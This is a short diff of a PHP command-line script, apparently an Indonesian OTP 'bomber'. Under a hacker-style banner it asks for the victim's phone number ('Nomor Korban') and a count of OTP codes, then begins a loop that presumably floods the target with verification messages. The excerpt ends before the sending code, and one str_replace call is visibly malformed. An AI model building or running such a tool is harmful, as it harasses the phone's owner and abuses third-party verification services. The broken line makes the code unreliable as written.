@@ -1,4 +1,4 @@
-<?php
+<?
 
 echo "\033[32;1m     	      ###############################  
  \033[32;1m             # \033[31;1mAuthor     \033[37;1m: \033[36;1mMr.L00L   	    \033[32;1m# 
@@ -12,14 +12,14 @@ echo "\033[32;1m     	      ###############################
  \033[32;1m             # \033[31;1mThanks To \033[37;1m : \033[36;1mMicroClone     \033[32;1m#                   
  \033[32;1m             ###############################\n\n" ;
 
-echo "\033[32;1m[\033[31;1m!\033[32;1m] Nomor Korban ==> \033[33;1m";
+echo "\033[32;1m[\033[31;1m!\033[32;1m] Nomor Korban [=======> \033[33;1m";
 $nomer = trim(fgets(STDIN));
 if(strlen($nomer)==11){
 	$nomer = str_replace("0","62".$nomer);
 }elseif(strlen($nomer)>12){
 	$nomer = str_replace("62","0",$nomer);
 }
-echo "\033[32;1m[\033[31;1m!\033[32;1m] Jumlah Kode OTP ==> \033[33;1m";
+echo "\033[32;1m[\033[31;1m!\033[32;1m] Jumlah Kode OTP [=======> \033[33;1m";
 $jumlah = trim(fgets(STDIN));
 for($a=0;$a<$jumlah;$a++) {
 	$rand1 = md5(rand(12345678,98765432));
